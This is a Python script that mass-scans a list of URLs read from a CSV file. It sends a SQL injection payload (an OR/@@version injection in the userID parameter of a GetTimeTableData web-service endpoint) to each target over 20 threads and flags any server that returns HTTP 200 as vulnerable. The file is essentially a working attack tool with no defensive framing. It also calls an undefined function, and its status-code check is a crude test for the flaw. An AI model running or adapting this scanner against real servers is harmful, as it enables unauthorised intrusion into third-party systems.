from requests.models import Response as Response
from SpiderMan import *
file_path="/root/zichan/学分.csv"
class Scan_NC(Scan_base):
    def __init__(self, response: Response, url: str) -> None:
        super().__init__(response, url)
        
    def scans(self)->str:
        if self.response.status_code==200:
            return self.url+"存在漏洞"
        return None
        
        
headers={
"User-Agent": "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1"
}
payload="/WebService/Interactive.asmx/GetTimeTableData?startDate=&userID=1'+OR+1+IN+(SELECT+@@version)+--+-"

def thread_pool(urls: list, thread_num: int, method: str, data: dict, keys: str = None):  
    results = []  
    with ThreadPoolExecutor(max_workers=thread_num) as executor:  
        if method == 'get':  
            futures = [executor.submit(spider_get, url+payload, headers) for url in urls]  
        elif method == 'post':  
            futures = [executor.submit(spider_post, url, headers, data) for url in urls]  

        for future in as_completed(futures):  
            response, url = future.result()  
            if response:  
                if keys:  
                    scan = Scan_bykeys(response, url)  
                    scan_result = scan.scans(keys)  
                else:  
                    scan = Scan_NC(response, url)  
                    scan_result = scan.scans()  
                if scan_result:  
                    results.append(scan_result)  
                    print(scan_result)  
            else:  
               print(f"No response for {url}")  
    return results  
      
        
urls=data_deal(file_path)


Scan_results=thread_pool2(urls,20,'get',{})